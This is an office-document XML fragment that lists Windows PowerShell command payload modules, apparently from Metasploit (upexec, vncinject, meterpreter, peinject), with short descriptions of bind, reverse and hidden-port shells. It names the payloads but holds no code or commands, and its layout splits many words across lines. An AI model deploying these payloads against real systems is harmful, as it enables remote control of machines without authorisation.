      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_uuid <text:s text:c="20"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Listen for a connection wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th UUID Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/f <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tag <text:s text:c="25"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Use an established connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_ipv6_tcp <text:s text:c="17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 over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_nonx_tcp <text:s text:c="17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 (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_ord_tcp <text:s text:c="18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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_allports <text:s text:c="13"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Try to connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker, on all possible port</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_dns <text:s text:c="18"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Connect back to the attack</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4 <text:s text:c="18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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4_dns <text:s text:c="14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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_uuid <text:s text:c="17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 with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/upexec/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_udp <text:s text:c="22"/>ommand via PowerShell. Uploads</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an executable and runs it (stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed). Connect back to the attack</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_hidden_ipknock_tcp <text:s text:c="7"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_hidden_tcp <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_ipv6_tcp <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_ipv6_tcp_uuid <text:s text:c="12"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_named_pipe <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_nonx_tcp <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp <text:s text:c="22"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp_rc4 <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp_uuid <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/find_tag <text:s text:c="22"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_hop_http <text:s text:c="14"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over an HTTP or HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS hop point. Note that you mu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>st first upload data/hop/hop.ph</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>p to the PHP server you wish to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_http <text:s text:c="18"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_http_proxy_pstore <text:s text:c="5"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_ipv6_tcp <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_nonx_tcp <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_ord_tcp <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp <text:s text:c="19"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_allports <text:s text:c="10"/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_dns <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_rc4 <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_rc4_dns <text:s text:c="11"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_uuid <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/vncinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_winhttp <text:s text:c="15"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_ipv6_tcp <text:s text:c="16"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_ipv6_tcp_uuid <text:s text:c="11"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_named_pipe <text:s text:c="14"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a pi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pe connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_tcp <text:s text:c="21"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_tcp_rc4 <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/bind_tcp_uuid <text:s text:c="16"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection with UUID Support (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_http <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ninet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_https <text:s text:c="16"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ninet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_named_pipe <text:s text:c="11"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker via a named pipe</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_tcp <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_tcp_rc4 <text:s text:c="14"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_tcp_uuid <text:s text:c="13"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_winhttp <text:s text:c="14"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/cust <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>om/reverse_winhttps <text:s text:c="13"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTPS (Windows x64 w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/exec <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand via PowerShell. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an arbitrary command (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/load <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>library <text:s text:c="25"/>ommand via PowerShell. Load an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>arbitrary x64 library path</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mess <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>agebox <text:s text:c="26"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dialog via MessageBox using a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ustomizable title, text &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_ipv6_tcp <text:s text:c="11"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_ipv6_tcp_uuid <text:s text:c="6"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_named_pipe <text:s text:c="9"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_tcp <text:s text:c="16"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_tcp_rc4 <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/bind_tcp_uuid <text:s text:c="11"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_http <text:s text:c="12"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_https <text:s text:c="11"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_named_pipe <text:s text:c="6"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_tcp <text:s text:c="13"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_tcp_rc4 <text:s text:c="9"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_tcp_uuid <text:s text:c="8"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_winhttp <text:s text:c="9"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/mete <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rpreter/reverse_winhttps <text:s text:c="8"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/bind_ipv6_tcp <text:s text:c="14"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/bind_ipv6_tcp_uuid <text:s text:c="9"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/bind_named_pipe <text:s text:c="12"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
